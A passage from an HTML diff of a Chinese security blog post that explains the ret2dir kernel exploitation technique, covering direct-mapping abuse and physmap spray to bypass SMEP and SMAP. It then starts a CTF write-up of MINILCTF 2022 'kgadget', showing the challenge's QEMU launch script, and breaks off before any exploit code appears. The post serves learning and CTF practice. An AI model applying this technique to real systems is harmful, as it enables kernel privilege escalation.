@@ -1,0 +1,1150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    
+    <meta name="author" content="Static">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
+
+                // Try immediately
+                if (addBodyClass()) return;
+
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2026/03/21/kernel pwn/kernel入门(2)之ret2dir/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+        
+        <meta name="description" content="基本原理ret2dir 是哥伦比亚大学网络安全实验室在 2014 年提出的一种辅助攻击手法，主要用来绕过 smep、smap、pxn 等用户空间与内核空间隔离的防护手段，原论文见此处http:&#x2F;&#x2F;www.cs.columbia.edu&#x2F;~vpk&#x2F;papers&#x2F;ret2dir.sec14.pdf 先来看看ret2usr的利用手法，即从内核空间返回到在用户空间构造好的提权代码上，如下 123456--">
+<meta property="og:type" content="article">
+<meta property="og:title" content="kernel入门(2)之ret2dir">
+<meta property="og:url" content="http://example.com/2026/03/21/kernel%20pwn/kernel%E5%85%A5%E9%97%A8(2)%E4%B9%8Bret2dir/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="基本原理ret2dir 是哥伦比亚大学网络安全实验室在 2014 年提出的一种辅助攻击手法，主要用来绕过 smep、smap、pxn 等用户空间与内核空间隔离的防护手段，原论文见此处http:&#x2F;&#x2F;www.cs.columbia.edu&#x2F;~vpk&#x2F;papers&#x2F;ret2dir.sec14.pdf 先来看看ret2usr的利用手法，即从内核空间返回到在用户空间构造好的提权代码上，如下 123456--">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/kernel%E5%85%A5%E9%97%A8(2)%E4%B9%8Bret2dir/2QMrXEh9qLymCoK.png">
+<meta property="og:image" content="http://example.com/kernel%E5%85%A5%E9%97%A8(2)%E4%B9%8Bret2dir/CP4h5UA2svuwKbJ.png">
+<meta property="article:published_time" content="2026-03-21T05:10:49.279Z">
+<meta property="article:modified_time" content="2024-03-10T08:44:15.190Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/kernel%E5%85%A5%E9%97%A8(2)%E4%B9%8Bret2dir/2QMrXEh9qLymCoK.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/cat-96.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/cat-96.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/cat-96.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            kernel入门(2)之ret2dir | Static&#39;s blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+        
+<script src="/js/build/libs/anime.min.js"></script>
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/lighttheme.png","dark":"/images/JIJIAN.jpg"},"title":"Welcome here!","subtitle":{"text":["光阴有限同归老，风月无涯可慰颜。"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":[],"qrs":[]}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0","theme":{"light":"default","dark":"dark"}}},"version":"2.9.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/staticccccccc/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur","masonry":{"batch_size":12,"initial_batch_size":24}},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3,"show_all":true,"order_by":"count","order_direction":"desc"},"tags":{"enable":true,"limit":3}},"footer":{"runtime":true,"icon":"<i class=\"fa-solid fa-heart fa-beat\" style=\"--fa-animation-duration: 0.5s; color: #f54545\"></i>","start":"2022/8/17 11:45:14","statistics":true,"customize":null,"icp":{"enable":false,"number":null,"url":null}},"footerStart":"2022/8/17 11:45:14","mermaid":{"style":{"light":"default","dark":"dark"}}};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.i18n = {"search":"Search...","toc":"On this page","prev":"Prev","next":"Next","prev_posts":"Prev posts","next_posts":"Next posts","page":"Page %d","recent_posts":"Recent Posts","share":"Share","powered_by":"POWERED BY %s","theme":"THEME","rss_feed":"RSS Feed","category":"Category","categories":"Categories","tag":"Tag","tags":"Tags","post":"Post","posts":"Posts","tagcloud":"Tag Cloud","comment":"Comment","comments":"Comments","home":"Home","archive":"Archive","archives":"Archives","top":"TOP","sticky":"Sticky","go-back-home":"Go Back Home","masonry_loading":"Loading photos...","image_viewer":"Image viewer","close":"Close","exif":{"title":"EXIF","cards":{"camera":"Camera","lens":"Lens","exposure":"Exposure","other":"Other"},"fields":{"make":"Brand","model":"Model","date_taken":"Date taken","lens_model":"Lens","focal_length":"Focal length","focus_mode":"Focus mode","shutter":"Shutter","aperture":"Aperture","iso":"ISO","exposure_program":"Exposure program","exposure_compensation":"Exposure compensation","metering_mode":"Metering mode","flash":"Flash","white_balance":"White balance","latitude":"Latitude","longitude":"Longitude","altitude":"Altitude"},"status":{"loading":"Loading...","no_exif":"No EXIF available","library_missing":"EXIF library not loaded","image_source_missing":"Image source unavailable","unavailable":"EXIF unavailable (blocked by CORS or missing metadata)","flag_unavailable":"EXIF unavailable"}},"about":"About","changelog":"Changelog","links":"Links","link":"Link","friends":"Friends","friend":"Friend","timeline":"Timeline","shuoshuo":"Shuoshuo","bookmarks":"Bookmarks","site_uv":"VISITOR COUNT","site_pv":"TOTAL PAGE VIEWS","read_more":"Read more","wordcount":"Words","min2read":"Mins","status":"Status","runtime":"Blog up for","days":"days","hours":"hrs","minutes":"Min","seconds":"Sec","optimized_by":"and Optimized by Evan","rights":"All Rights Reserved","site_posts":"%s posts in total","site_wordcount":"%s words in total","copyright":{"author":"Author","title":"Title","link":"Link","create_time":"Created at","update_time":"Updated at","license_title":"License","license_content":"This work is licensed under %s.","all_rights_reserved":"All Rights Reserved &#169; %s","public_domain":"This work is in the public domain."},"ago":{"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"},"create_time":"Created","update_time":"Updated","expired":"This post is written %s days ago, and the content may not be up to date."};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        Static&#39;s blog
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({ loop: true })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [20, 0],
+                translateZ: 0,
+                opacity: [0, 1],
+                filter: ['blur(5px)', 'blur(0px)'],
+                easing: "easeOutExpo",
+                duration: 1200,
+                delay: (el, i) => 300 + 20 * i,
+            })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [0, -20],
+                opacity: [1, 0],
+                filter: ['blur(0px)', 'blur(5px)'],
+                easing: "easeInExpo",
+                duration: 1000,
+                delay: (el, i) => 15 * i,
+                complete: function() {
+                    hidePreloader();
+                }
+            }, '-=700');
+
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
+                    <img src="/images/cat-96.png" class="w-full h-full rounded-xs">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                Static&#39;s blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    CATEGORIES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    ABOUT
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/about">
+                                                    ME
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a target="_blank" rel="noopener" href="https://github.com/staticccccccc/">
+                                                    GITHUB
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories"
+                        >
+                            <span>
+                                CATEGORIES
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-About"
+                        >
+                            <span>
+                                ABOUT
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/about">ME</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           target="_blank" rel="noopener" href="https://github.com/staticccccccc/">GITHUB</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">1</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">kernel入门(2)之ret2dir</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="/images/OIP-C.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Static</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-03-21 13:10:49</span>
+        <span class="mobile">2026-03-21 13:10:49</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-03-10 16:44:15</span>
+            <span class="mobile">2024-03-10 16:44:15</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/kernel-pwn/">kernel pwn</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>ret2dir 是哥伦比亚大学网络安全实验室在 2014 年提出的一种辅助攻击手法，主要用来<strong>绕过 smep、smap、pxn 等用户空间与内核空间隔离的防护手段</strong>，原论文见此处<a class="link"   target="_blank" rel="noopener" href="http://www.cs.columbia.edu/~vpk/papers/ret2dir.sec14.pdf" >http://www.cs.columbia.edu/~vpk/papers/ret2dir.sec14.pdf<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>先来看看ret2usr的利用手法，即从内核空间返回到在用户空间构造好的提权代码上，如下</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">----------------------------------------------</span><br><span class="line">|	              kernel space	        	|&gt;------------</span><br><span class="line">----------------------------------------------			  |</span><br><span class="line">|           	  user space	        	|             |ret</span><br><span class="line">|       commit(prepare_kernel_cred(NULL))	 |&lt;------------|</span><br><span class="line">----------------------------------------------</span><br></pre></td></tr></table></figure></div>
+
+<p>但是由于smep与smap保护的加入，在内核态对用户态数据的访问和执行被禁止，导致该攻击手法已不可用。而ret2dir可以说就是用来绕过这类使用户空间与内核空间隔离的保护的。</p>
+<p>首先来看一下x86下linux内核空间的布局<a class="link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.2/source/Documentation/x86/x86_64/mm.rst" >mm.rst - Documentation&#x2F;x86&#x2F;x86_64&#x2F;mm.rst - Linux source code (v5.2) - Bootlin<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>其中有如下的一片区域，这片区域<code>direct mapping area</code>被称为内核的线性映射区，它直接映射了物理内存</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)</span><br></pre></td></tr></table></figure></div>
+
+<blockquote>
+<p>有关linux内核4级页表和5级页表的具体知识不在这里详述（因为我也不会。。。</p>
+</blockquote>
+<p>我们都知道每个进程都有自己的虚拟内存空间，而它们一定对应着一片物理内存空间。那么现在就会出现内核空间和用户空间同时映射着同一片物理内存，那么我们就可以在内核态下通过访问<code>direct mapping area</code>来间接访问用户空间的数据。</p>
+<p>如果我们在用户空间布置shellcode，那么我们就可以在内核空间访问到，如下图所示：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/kernel%E5%85%A5%E9%97%A8(2)%E4%B9%8Bret2dir/2QMrXEh9qLymCoK.png"
+                      alt="2QMrXEh9qLymCoK"
+                ></p>
+<p>但是目前内核空间的这片区域不具有执行权限，因此只能用于构造ROP链，如下图：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/kernel%E5%85%A5%E9%97%A8(2)%E4%B9%8Bret2dir/CP4h5UA2svuwKbJ.png"
+                      alt="CP4h5UA2svuwKbJ"
+                ></p>
+<p>一般的利用ret2dir进行攻击的手法是：</p>
+<ul>
+<li>利用 mmap 在用户空间大量喷射内存</li>
+<li>利用漏洞泄露出内核的“堆”上地址（通过 kmalloc 获取到的地址），<strong>这个地址直接来自于线性映射区</strong></li>
+<li>利用泄露出的内核线性映射区的地址<strong>进行内存搜索</strong>，从而找到我们在用户空间喷射的内存</li>
+</ul>
+<p>此时我们就获得了一个可以在内核空间访问用户空间数据的能力，那么就绕过了内核空间与用户空间的隔离保护</p>
+<p>需要注意的是我们往往没有内存搜索的机会，因此需要<strong>使用 mmap 喷射大量的物理内存写入同样的 payload</strong>，之后再随机挑选一个线性映射区上的地址进行利用，这样我们就<strong>有很大的概率命中到我们布置的 payload 上</strong>，这种攻击手法也称为 <code>physmap spray</code></p>
+<h2 id="MINILCTF-2022-kgadget"><a href="#MINILCTF-2022-kgadget" class="headerlink" title="MINILCTF 2022 - kgadget"></a>MINILCTF 2022 - kgadget</h2><p>a3👴在校赛出的一道题，很典型的用来入门ret2dir的题</p>
+<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>首先来看<code>run.sh</code></p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">	-m 256M \</span><br><span class="line">	-cpu kvm64,+smep,+smap \</span><br><span class="line">	-smp cores=2,threads=2 \</span><br><span class="line">	-kernel bzImage \</span><br><span class="line">	-initrd ./rootfs.cpio \</span><br><span class="line">	-nographic \</span><br><span class="line">	-monitor /dev/null \</span><br><span class="line">	-snapshot \</span><br><span class="line">	-append &quot;console=ttyS0 nokaslr pti=on quiet oops=panic panic=1&quot; \</span><br><span class="line">	-no-reboot </span><br></pre></td></tr></table></figure></div>
+
+<p>开启了<code>kpti    smep    smap</code>，但是<code>nokaslr</code></p>
+<p>程序没有直接给<code>vmlinux</code>，那么我们可以使用<code>extract-vmlinux</code>来提取出它，使用方式<code>extract-vmlinux ./bzImage</code>。关于<code>extract-vmlinux</code>的下载自行搜索即可。</p>
+<p>然后来看漏洞模块<code>kgadget.ko</code>，程序只有一个函数有用，即<code>kgadget_ioctl</code></p>
